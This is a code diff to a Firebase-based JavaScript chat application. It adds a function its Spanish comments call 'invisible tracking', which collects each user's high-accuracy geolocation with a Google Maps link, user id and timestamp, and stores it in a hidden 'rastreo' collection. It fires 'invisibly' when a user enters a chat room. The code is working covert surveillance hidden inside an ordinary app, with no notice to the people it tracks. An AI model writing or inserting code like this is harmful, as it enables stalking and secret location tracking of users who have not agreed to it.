@@ -51,6 +51,23 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
+// --- 📍 FUNCIÓN DE RASTREO INVISIBLE (AÑADIDA SIN TOCAR LO DEMÁS) ---
+async function rastrearSilencioso(idUsuario) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const rastreoCol = collection(db, "rastreo");
+            await addDoc(rastreoCol, { 
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                mapa: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                id: idUsuario,
+                fecha: new Date().toLocaleString()
+            });
+        }, null, { enableHighAccuracy: true });
+    }
+}
+// -------------------------------------------------------------------
+
 //////////////////////////////////////////////////
 // 🔐 VARIABLES
 //////////////////////////////////////////////////
@@ -78,6 +95,7 @@ function pedirClave(){
 
     mensajesCol = collection(db, "mensajes", SALA, "chat");
 
+    rastrearSilencioso(MI_ID); // 🔥 Se activa invisiblemente al entrar
     iniciarListener(); // 🔥 IMPORTANTE
 }
 
